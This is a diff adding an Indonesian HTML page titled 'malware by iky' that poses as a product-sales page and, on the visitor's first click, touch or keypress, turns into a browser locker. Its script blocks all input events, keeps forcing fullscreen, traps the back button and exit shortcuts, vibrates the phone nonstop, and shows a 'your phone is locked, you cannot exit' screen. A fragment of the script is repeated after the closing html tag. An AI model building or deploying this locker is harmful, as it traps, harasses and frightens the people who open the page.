@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>malware by iky</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    /* Bagian Reset Total(bebas Rename) */
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      /* overflow: hidden !important;  // Akan diatur nanti saat lockdown aktif */
+      background: #f0f0f0; /* Latar belakang cerah untuk web jualan */
+      touch-action: auto !important; /* Biarkan touch normal di awal */
+      -webkit-touch-callout: default;
+      -webkit-user-select: auto;
+      -khtml-user-select: auto;
+      -moz-user-select: auto;
+      -ms-user-select: auto;
+      user-select: auto;
+      position: relative; /* Kembali ke posisi normal */
+      cursor: auto !important; /* Tampilkan kursor normal */
+      font-family: Arial, sans-serif; /* Font umum untuk web jualan */
+    }
+
+    /* Bagian Hujan Matrix(Bebas Rename) */
+    #matrix {
+      display: none; /* Sembunyikan efek matrix di awal */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1;
+      opacity: 0.7;
+    }
+
+    /* Bagian Layer Utama (Tampilan Produk) */
+    #lockScreen {
+      position: relative; /* Biarkan relatif untuk layout normal */
+      top: auto;
+      left: auto;
+      width: 100%;
+      min-height: 100vh; /* Gunakan min-height untuk scroll jika konten banyak */
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start; /* Mulai dari atas */
+      align-items: center;
+      color: #333; /* Warna teks gelap */
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      box-sizing: border-box; /* Pastikan padding tidak membuat lebar melebihi 100% */
+      /* pointer-events: auto; // Ini dihapus dari sini */
+      background-color: #fff; /* Latar belakang putih */
+    }
+
+    #lockScreen h1 {
+      color: #007bff; /* Warna judul produk */
+      margin-bottom: 10px;
+      font-size: 2.5em;
+    }
+
+    #lockScreen p {
+      color: #666;
+      font-size: 1.1em;
+      margin-bottom: 20px;
+      max-width: 800px;
+      line-height: 1.6;
+    }
+
+    .product-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 20px;
+        margin-top: 30px;
+        width: 100%;
+        max-width: 900px;
+    }
+
+    .product-item {
+        background: #f9f9f9;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        padding: 20px;
+        text-align: left;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+    }
+
+    .product-item img {
+        max-width: 100%;
+        height: auto;
+        border-radius: 5px;
+        margin-bottom: 15px;
+    }
+
+    .product-item h2 {
+        color: #333;
+        font-size: 1.8em;
+        margin-bottom: 10px;
+    }
+
+    .product-item .price {
+        color: #e60000;
+        font-size: 1.5em;
+        font-weight: bold;
+        margin-bottom: 15px;
+    }
+
+    /* ANTI EXIT */
+    #antiExit {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 9999;
+      color: red;
+      font-size: 2em;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      pointer-events: none;
+    }
+
+    /* NOTIF BLOCKER */
+    #notifBlocker {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 30px;
+      background: black;
+      z-index: 10000;
+      display: none;
+      pointer-events: none;
+    }
+
+    /* STYLE TOMBOL */
+    #actionBtn {
+      margin-top: 30px;
+      padding: 15px 30px;
+      background: #007bff; /* Warna tombol utama */
+      border: none;
+      color: white;
+      font-family: Arial, sans-serif;
+      font-size: 1.4em;
+      cursor: pointer; /* Tampilkan kursor pointer */
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+      animation: none; /* Hapus animasi glow di awal */
+      pointer-events: auto; /* Pastikan tombol bisa diklik */
+    }
+
+    #actionBtn:hover {
+      background-color: #0056b3;
+    }
+
+    /* Gaya saat LOCKDOWN aktif */
+    body.locked {
+        overflow: hidden !important;
+        touch-action: none !important;
+        -webkit-touch-callout: none;
+        -webkit-user-select: none;
+        -khtml-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        position: fixed;
+        cursor: none !important;
+        width: 100%;
+        height: 100%;
+    }
+
+    body.locked #matrix {
+        display: block; /* Tampilkan matrix saat lockdown */
+    }
+
+    body.locked #lockScreen {
+        background: #000; /* Ubah latar belakang menjadi hitam saat lockdown */
+        color: #0f0; /* Ubah warna teks menjadi hijau saat lockdown */
+        text-shadow: 0 0 10px #0f0;
+        font-family: 'Courier New', monospace;
+        pointer-events: none; /* Blokir klik saat lockdown */
+    }
+    body.locked #lockScreen h1,
+    body.locked #lockScreen p,
+    body.locked .product-item,
+    body.locked .product-item h2,
+    body.locked .product-item .price,
+    body.locked .product-item p.description {
+        color: #0f0; /* Pastikan semua teks berubah warna */
+        background: transparent; /* Hapus latar belakang item produk */
+        border: none; /* Hapus border item produk */
+        box-shadow: none; /* Hapus shadow item produk */
+    }
+    body.locked #actionBtn {
+        background: transparent;
+        border: 2px solid #0f0;
+        color: #0f0;
+        font-family: 'Courier New', monospace;
+        font-size: 1.2em;
+        animation: glow 2s infinite; /* Aktifkan glow lagi */
+    }
+
+    /* Responsif untuk layar kecil */
+    @media (max-width: 768px) {
+        #lockScreen {
+            padding: 15px;
+        }
+        #lockScreen h1 {
+            font-size: 1.8em;
+        }
+        #lockScreen p {
+            font-size: 1em;
+        }
+        .product-item {
+            padding: 15px;
+        }
+        .product-item h2 {
+            font-size: 1.5em;
+        }
+        .product-item .price {
+            font-size: 1.2em;
+        }
+        #actionBtn {
+            padding: 12px 25px;
+            font-size: 1.1em;
+        }
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div id="lockScreen">
+  <h1>Selamat Hp Anda Terkunci @rkyyzz</h1>
+  <p>Pasti Kamu Panik ©404</p>
+
+  <div class="product-container">
+    <div class="product-item">
+      <img src="https://files.catbox.moe/rso3qa.jpg" alt="Produk Keren 1">
+      <h2>orang setres 1</h2>
+      <p class="description"panel unli</p>
+      <div class="price">Rp 1.000</div>
+    </div></div>
+
+  <button id="actionBtn">BELI SEKARANG & DAPATKAN BONUS</button>
+</div>
+
+<div id="antiExit">
+  <h2>SISTEM HP TERKUNCI</h2>
+  <p>Akses ditolak! Anda tidak bisa keluar ©rkyyzz.</p>
+</div>
+
+<div id="notifBlocker"></div>
+
+<script>
+  // ====================== CORE SYSTEM ======================
+  let isLocked = false;
+  const antiExit = document.getElementById('antiExit');
+  const notifBlocker = document.getElementById('notifBlocker');
+  let vibrateInterval = null; // Variabel untuk menyimpan interval vibrasi
+  const lockScreenElement = document.getElementById('lockScreen'); // Dapatkan elemen lockScreen
+
+  // Fungsi utilitas untuk mencegah event
+  function blockEvent(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+    return false;
+  }
+
+  // 1. STEALTH FULLSCREEN INITIATION (Lebih gigih)
+  function stealthFullscreen() {
+    if (!document.fullscreenElement) { // Hanya request jika belum fullscreen
+      const el = document.documentElement;
+      const methods = [
+        'requestFullscreen',
+        'webkitRequestFullscreen',
+        'mozRequestFullScreen',
+        'msRequestFullscreen'
+      ];
+      
+      methods.forEach(method => {
+        if (el[method]) {
+          try {
+            el[method]({navigationUI: "hide"}).catch(e => {
+              // Gagal, mungkin karena user tidak interaksi, coba lagi nanti
+              console.warn("Fullscreen request failed (likely no user interaction yet):", e);
+            });
+          } catch(e) {
+            console.error("Error calling fullscreen method:", e);
+          }
+        }
+      });
+    }
+  }
+
+  // Fungsi untuk memulai vibrasi tanpa jeda
+  function startVibrationContinuous() {
+    if ("vibrate" in navigator) {
+      const shortVibrateDuration = 200; // Getar 200ms
+      const intervalDelay = 100; // Panggil setiap 100ms, lebih pendek dari durasi getar
+
+      vibrateInterval = setInterval(() => {
+        navigator.vibrate(shortVibrateDuration);
+      }, intervalDelay); 
+      
+      console.log("Continuous vibration started.");
+    } else {
+      console.warn("Vibration API not supported on this device/browser.");
+    }
+  }
+
+  // Fungsi untuk menghentikan vibrasi (opsional, untuk debugging)
+  function stopVibration() {
+    if (vibrateInterval) {
+      clearInterval(vibrateInterval);
+      vibrateInterval = null;
+      if ("vibrate" in navigator) {
+        navigator.vibrate(0); // Menghentikan getaran yang sedang berlangsung
+      }
+      console.log("Vibration stopped.");
+    }
+  }
+
+  // 2. TOTAL SYSTEM LOCKDOWN (Blokir lebih banyak interaksi)
+  function activateLockdown() {
+    if (isLocked) return; // Pastikan hanya dijalankan sekali
+    isLocked = true;
+    
+    // Tambahkan class 'locked' ke body saat lockdown aktif
+    document.body.classList.add('locked');
+
+    // Blokir semua interaksi secara menyeluruh pada dokumen
+    const eventsToBlock = [
+      'click', 'dblclick', 'mousedown', 'mouseup', 'mousemove', 'wheel', 'scroll',
+      'touchstart', 'touchend', 'touchmove', 'touchcancel',
+      'keydown', 'keyup', 'keypress',
+      'pointerdown', 'pointerup', 'pointermove', 'pointercancel', 'pointerleave', 'pointerenter',
+      'contextmenu', 
+      'selectstart' 
+    ];
+
+    eventsToBlock.forEach(evt => {
+      document.addEventListener(evt, blockEvent, {capture: true, passive: false});
+    });
+
+    // Coba aktifkan fullscreen
+    stealthFullscreen();
+
+    // Aktifkan notifikasi blocker
+    notifBlocker.style.display = 'block';
+    
+    // Mulai getaran perangkat tanpa jeda
+    startVibrationContinuous();
+
+    // Interval untuk memastikan fullscreen tetap aktif
+    setInterval(() => {
+      if (!document.fullscreenElement) {
+        stealthFullscreen();
+      }
+    }, 500);
+
+    // Mencegah blur event (perpindahan tab/window)
+    window.addEventListener('blur', () => {
+        if (isLocked) {
+            window.focus(); 
+            stealthFullscreen(); 
+            showAntiExit(); 
+        }
+    });
+
+    // Mencegah shortcut keyboard yang umum (Ctrl+W, Alt+F4, F12, dsb.)
+    document.addEventListener('keydown', (e) => {
+        if (isLocked) {
+            if (e.altKey && e.key === 'F4' || 
+                (e.ctrlKey && e.key === 'w') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.key === 'F12') ||
+                (e.key === 'Escape')) { 
+                blockEvent(e);
+                showAntiExit(); 
+            }
+        }
+    }, {capture: true, passive: false});
+  }
+
+  // 3. ANTI EXIT SYSTEMS (Sistem anti-keluar lebih agresif)
+  function initAntiExit() {
+    // Blokir tombol back
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => {
+      history.pushState(null, null, location.href); 
+      showAntiExit(); 
+      stealthFullscreen(); 
+    };
+
+    // Deteksi perubahan visibility (tab beralih)
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState !== 'visible' && isLocked) {
+        showAntiExit();
+        stealthFullscreen();
+      } else if (document.visibilityState === 'visible' && isLocked) {
+          stealthFullscreen();
+      }
+    });
+
+    // Deteksi resize (jika keluar dari fullscreen secara paksa)
+    window.addEventListener('resize', () => {
+      if (!document.fullscreenElement && isLocked) {
+        showAntiExit();
+        stealthFullscreen();
+      }
+    });
+  }
+
+  function showAntiExit() {
+    antiExit.style.display = 'flex';
+    stealthFullscreen(); 
+    setTimeout(() => {
+      antiExit.style.display = 'none';
+      if (!document.fullscreenElement) { 
+          stealthFullscreen(); 
+      }
+    }, 2000);
+  }
+
+  // 4. MATRIX EFFECT (Tidak berubah banyak, visual saja)
+  function initMatrix() {
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    
+    const chars = "01";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = [];
+    
+    for (let i = 0; i < columns; i++) drops[i] = 1;
+
+    function draw() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#0f0';
+      ctx.font = fontSize + 'px monospace';
+      
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize * 1.5 > canvas.height && Math.random() > 0.975) drops[i] = 0; 
+        drops[i]++;
+      }
+    }
+    
+    setInterval(draw, 33);
+    // Tambahkan resize listener untuk canvas matrix
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const newColumns = canvas.width / fontSize;
+        for (let i = 0; i < newColumns; i++) drops[i] = drops[i] || 1; 
+        drops.length = newColumns;
+    });
+  }
+
+  // ====================== INITIALIZATION ======================
+  document.addEventListener('DOMContentLoaded', () => {
+    initMatrix(); // Inisialisasi matrix tapi display:none di CSS
+    initAntiExit();
+    stealthFullscreen(); // Coba request fullscreen di awal (mungkin gagal)
+    
+    const actionBtn = document.getElementById('actionBtn');
+    
+    // Pastikan tombol juga memicu lockdown
+    if (actionBtn) {
+        actionBtn.addEventListener('click', (e) => {
+            // Kita ingin klik tombol ini juga memicu lockdown, tetapi kita tidak ingin
+            // event click menyebar ke lockScreenElement jika kita tidak mau
+            e.stopPropagation(); // Mencegah event menyebar ke parent (lockScreenElement)
+            activateLockdown();
+        });
+    }
+
+    // Tangkap semua interaksi di lockScreenElement untuk aktifkan lockdown
+    // Ini akan menutupi seluruh area "web jualan"
+    if (lockScreenElement) {
+        lockScreenElement.addEventListener('click', activateLockdown, {once: true});
+        lockScreenElement.addEventListener('touchstart', activateLockdown, {once: true});
+    }
+    
+    // Tetap aktifkan lockdown untuk keydown di body (untuk pengguna keyboard)
+    document.body.addEventListener('keydown', activateLockdown, {once: true});
+  });
+
+  // Auto reload setiap 1 menit sebagai fallback
+  setTimeout(() => {
+    if (isLocked) { 
+        location.reload();
+    }
+  }, 60000);
+</script>
+</body>
+</html>  // Tangkap semua interaksi di lockScreenElement untuk aktifkan lockdown
+    // Ini akan menutupi seluruh area "web jualan"
+    if (lockScreenElement) {
+        lockScreenElement.addEventListener('click', activateLockdown, {once: true});
+        lockScreenElement.addEventListener('touchstart', activateLockdown, {once: true});
+    }
+    
+    // Tetap aktifkan lockdown untuk keydown di body (untuk pengguna keyboard)
+    document.body.addEventListener('keydown', activateLockdown, {once: true});
+  });
+
+  // Auto reload setiap 1 menit sebagai fallback
+  setTimeout(() => {
+    if (isLocked) { 
+        location.reload();
+    }
+  }, 60000);
+</script>
+</body>
+</html>
